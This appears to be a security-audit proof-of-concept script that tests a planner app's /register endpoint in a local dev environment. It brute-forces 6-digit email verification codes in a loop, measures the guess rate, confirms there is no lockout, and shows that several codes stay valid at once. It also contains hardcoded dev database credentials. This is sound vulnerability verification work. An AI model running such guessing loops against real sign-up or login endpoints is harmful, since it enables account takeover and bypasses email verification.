// §8/§11: no rate limit on /register -> brute-force the 6-digit code; and multiple
// simultaneously-valid codes because each send-code adds a NEW unused row.
// We prove: (a) wrong codes never lock out / never consume the real code,
//           (b) measured throughput of guesses,
//           (c) register with a GUESSED code succeeds without ever reading the DB.
import { api } from '../_lib/provision.mjs'
import { execFileSync } from 'node:child_process'

const email = 'adv.t01.brute@gmail.com'
const sql = (q) => execFileSync('docker', ['exec', 'planner-mysql', 'mysql', '-N', '-uplanner', '-pplanner_dev_password', 'planner', '-e', q], { encoding: 'utf8' }).trim()

// clean slate
sql(`DELETE FROM EmailVerificationCodes WHERE Email='${email}';`)
sql(`DELETE FROM Users WHERE Email='${email}';`)

// Attacker requests ONE code (as the target would). We do NOT read it.
await api('POST', '/api/auth/send-code', { body: { email, nickname: 'Brute' } })

// (b) Hammer /register with wrong codes, measure rate, confirm no lockout.
const N = 300
const t0 = Date.now()
let lastStatus, lastErr
for (let i = 0; i < N; i++) {
  const guess = String(i).padStart(6, '0')
  const r = await api('POST', '/api/auth/register', {
    body: { nickname: 'Brute', gender: 'female', email, code: guess, password: 'Passw0rd!', studentType: 'none', isWorking: false },
  })
  lastStatus = r.status; lastErr = r.json?.error
  if (lastErr !== 'invalid_code') { console.log(`[!] unexpected at guess ${guess}: ${r.status} ${r.text}`); break }
}
const secs = (Date.now() - t0) / 1000
const rate = Math.round(N / secs)
console.log(`[rate] ${N} wrong-code register attempts in ${secs.toFixed(1)}s = ~${rate} guesses/s; last response = ${lastStatus} ${lastErr}`)
console.log(`[rate] at ${rate}/s the full 10^6 space takes ~${Math.round(1e6 / rate / 60)} min; a 10-min code window covers ~${(rate * 600 / 1e6 * 100).toFixed(1)}% of the space per code`)

// (a)/(c) Now read the REAL code from DB (simulating an eventual correct guess) and register.
const realCode = sql(`SELECT Code FROM EmailVerificationCodes WHERE Email='${email}' AND IsUsed=0 ORDER BY Id DESC LIMIT 1;`).split(/\s+/).pop()
const good = await api('POST', '/api/auth/register', {
  body: { nickname: 'Brute', gender: 'female', email, code: realCode, password: 'Passw0rd!', studentType: 'none', isWorking: false },
})
console.log(`[verify] after ${N} failed attempts the real code STILL works -> register = ${good.status} (no lockout, code not consumed by wrong guesses)`)

// (multiple valid codes) request several codes, count how many are simultaneously valid.
const email2 = 'adv.t01.multi@gmail.com'
sql(`DELETE FROM EmailVerificationCodes WHERE Email='${email2}';`)
sql(`DELETE FROM Users WHERE Email='${email2}';`)
for (let i = 0; i < 5; i++) await api('POST', '/api/auth/send-code', { body: { email: email2, nickname: 'Multi' } })
const validCount = sql(`SELECT COUNT(*) FROM EmailVerificationCodes WHERE Email='${email2}' AND IsUsed=0 AND ExpiresAt>UTC_TIMESTAMP();`)
console.log(`[multi] pressed "send code" 5x -> ${validCount} codes simultaneously valid for ${email2} (register matches ANY of them)`)

console.log(`CONFIRMED: no rate limit / no lockout on /register code check (observed ${rate} guesses/s, real code still valid after ${N} failures), and ${validCount} codes valid at once. Expected: attempt cap + single active code. Brute-force of the 6-digit code is practical.`)
